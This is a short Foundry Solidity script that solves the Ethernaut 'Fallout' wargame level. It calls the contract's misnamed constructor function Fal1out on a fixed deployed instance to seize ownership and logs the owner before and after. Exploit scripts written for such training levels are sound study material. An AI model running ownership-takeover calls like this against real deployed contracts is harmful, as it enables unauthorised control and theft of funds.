// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
import "forge-std/Script.sol";
import {Fallout} from "../../src/ethernaut/fallout.sol";
import "forge-std/console.sol";

contract claimOwnership is Script {
    Fallout fallout =
        Fallout(payable(0x4e4E3d4441bbC5336458DB699C84F4Af99565EF6));

    function run() public {
        vm.startBroadcast();

        console.log("the owner is ", fallout.owner());
        fallout.Fal1out{value: 0}();
        console.log(msg.sender);
        console.log(fallout.owner());
        vm.stopBroadcast();
    }
}
